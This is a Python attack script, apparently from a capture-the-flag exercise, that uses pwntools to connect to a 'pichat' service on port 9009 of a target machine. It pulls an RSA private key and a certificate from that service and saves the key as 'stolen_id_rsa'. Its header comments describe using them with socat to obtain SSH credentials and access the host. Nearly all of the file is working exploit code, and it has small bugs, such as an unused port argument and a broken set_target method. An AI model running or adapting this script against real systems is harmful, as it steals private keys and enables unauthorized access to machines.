#!/usr/bin/env python3
############################################################
# This script contacts port 9009 on the target machine
# and pulls down both a certificate and key from pichat.
#
# The pulled down certificate and key can then be used
# in a socat command to obtain login (ssh) credentials for 
# a user, allowing the attacker to access the target
# machine.
############################################################
# Important Note:
# ---------------
# In order to use this script without error, you must have
# pwntools installed.
############################################################

import argparse
import os
import pwn
import re
import requests
import stat

ANSI_CLRLN = "\r\x1b[2K"
ANSI_RED = "\x1b[31;1m"
ANSI_GRN = "\x1b[32;1m"
ANSI_YLW = "\x1b[33;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_RST = "\x1b[0m"

class barney:
    def __init__(self, target=None):
        self.__certificate = None
        self.__rsa_key = None
        self.__target = target
        return

    def attempt_connect_http(self):
        try:
            target = f"http://{self.__target}"
            resp = requests.get(target, verify=False)
            if resp >= 400:
                raise ValueError(f"Bad Response Code ({resp.status_code} {resp.reason})")
            
            message = "Successfully connected to target."
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def attempt_connect_pichat(self):
        try:
            sock = pwn.connect(self.__target, 9009)

            sock.recvuntil(b"r?")
            sock.send(b"key")
            self.__rsa_key = sock.recvuntil(b"END RSA PRIVATE KEY-----\n").decode()

            sock.close()

            message = "Successfully pulled key."
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def get_cert(self):
        try:
            sock = pwn.connect(self.__target, 9009)

            sock.recvuntil(b"r?")
            sock.send(b"certificate")
            self.__certificate = sock.recvuntil(b"END CERTIFICATE-----\n").decode()

            sock.close()

            message = "Successfully pulled cert."
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def save_cert(self, outfile=None):
        try:
            if (outfile is None) or not(isinstance(outfile,str)):
                outfile = "cert"

            with open(outfile, "w") as fptr:
                fptr.write(self.__certificate)

            message = "Certificate saved."
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def save_rsa(self, outfile=None):
        try:
            if (outfile is None) or not(isinstance(outfile,str)):
                outfile = "stolen_id_rsa"

            with open(outfile, "w") as fptr:
                fptr.write(self.__rsa_key)

            rsuccess = self.set_rsa_perms(outfile)
            if not(rsuccess):
                raise ValueError(f"Unable to set permissions for \"{outfile}\"")

            message = f"RSA key saved to \"{outfile}\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def set_rsa_perms(self, filename):
        try:
            os.chmod(filename, stat.S_IREAD|stat.S_IWRITE)
            success = True
        except Exception as ex:
            success = False
        return success

    def set_target(new_target):
        try:
            if not(isinstance(new_target,str)):
                raise TypeError(f"Target must be a str, got \"{type(new_target)}\"")

            self.__target = new_target

            message = "Target set successfully."
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

def InfoMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def ErrMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def SucMsg(msg):
    if not(isinstance(msg,str)):
        msg = str(msg)
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

def main():
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    args = parser.parse_args()

    target = args.target
    port = args.port

    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")

    try:
        rubble = barney(target=target)
        success, message = rubble.attempt_connect_pichat()
        if not(success):
            raise ValueError(str(message))
        SucMsg(message)

        success, message = rubble.save_rsa()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        success, message = rubble.get_cert()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        success, message = rubble.save_cert()
        if not(success):
            raise ValueError(message)
        SucMsg(message)
    except Exception as ex:
        ErrMsg(f"{str(ex)}")

    return

if __name__ == "__main__":
    main()

